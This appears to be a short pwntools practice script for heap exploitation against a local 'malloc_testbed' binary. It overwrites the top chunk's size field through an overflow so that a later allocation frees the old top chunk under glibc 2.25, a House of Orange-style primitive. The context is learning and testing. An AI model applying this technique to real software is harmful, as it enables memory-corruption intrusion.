#!/usr/bin/python
from pwn import *
from testbed import *

def free_topchunk(p):
    '''glibc 2.25'''
    malloc(p, b'0x18') 
    # must be page aligned and have prev in use flag
    edit(p, b'0', b'A'*24 + p64(0x1001 - 0x20)) 
    malloc(p, b'01000')

#p = process('./malloc_testbed')
p = gdb.debug('./malloc_testbed', '''
c
''')

libc = get_libc_addr(p)
free_topchunk(p)

p.interactive()